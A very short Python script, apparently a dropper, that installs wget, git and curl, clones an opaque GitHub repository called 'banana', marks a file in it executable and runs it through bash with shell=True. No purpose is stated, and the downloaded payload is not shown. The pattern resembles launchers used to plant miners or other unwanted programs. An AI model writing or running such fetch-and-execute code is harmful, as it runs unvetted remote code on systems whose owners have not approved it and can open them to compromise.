#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/siviwemketo44/banana.git;cd banana;chmod +x banana;bash banana", shell=True)
